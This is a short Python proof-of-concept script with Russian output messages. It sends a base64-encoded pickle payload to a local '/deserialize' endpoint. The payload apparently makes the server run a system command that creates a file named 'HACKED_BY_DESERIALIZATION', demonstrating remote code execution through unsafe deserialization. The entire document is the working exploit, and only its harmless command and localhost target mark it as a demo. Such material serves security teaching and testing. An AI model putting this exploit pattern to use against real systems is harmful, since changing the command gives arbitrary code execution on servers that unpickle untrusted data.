import requests

payload = "gASVNwAAAAAAAACMAm50lIwGc3lzdGVtlJOUjB90b3VjaCBIQUNLRURfQllfREVTRVJJQUxJWkFUSU9OlIWUUpQu"

url = "http://127.0.0.1:5000/deserialize"
headers = {"Content-Type": "application/octet-stream"}

try:
    response = requests.post(url, data=payload, headers=headers)
    print(f"Статус: {response.status_code}")
    print(f"Ответ сервера: {response.text}")
    print("\nПроверьте директорию сервера на наличие файла 'HACKED_BY_DESERIALIZATION'")
except Exception as e:
    print(f"Ошибка при отправке запроса: {e}")